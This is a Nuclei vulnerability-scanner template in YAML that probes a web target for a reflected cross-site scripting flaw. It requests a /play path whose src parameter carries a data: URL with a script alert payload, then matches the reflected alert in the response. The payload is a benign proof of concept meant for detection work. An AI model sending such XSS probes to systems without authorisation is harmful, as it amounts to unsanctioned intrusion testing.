# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: ctp-xss
info:
  name: Click-to-Play Cross-Site Scripting (CTP-XSS)
  author: unknown
  severity: high
  description: Detects potential CTP-XSS vulnerabilities in the target
author: qaisar afridi
tags:
  - web
  - ctp-xss
http:
- method: GET
  path:
    - "/video"
    - "/play?src=data:text/html,<script>alert('CTP-XSS')</script>"
  matchers:
  - type: regex
    part: body
    regex:
    - "alert\\('CTP-XSS'\\)"
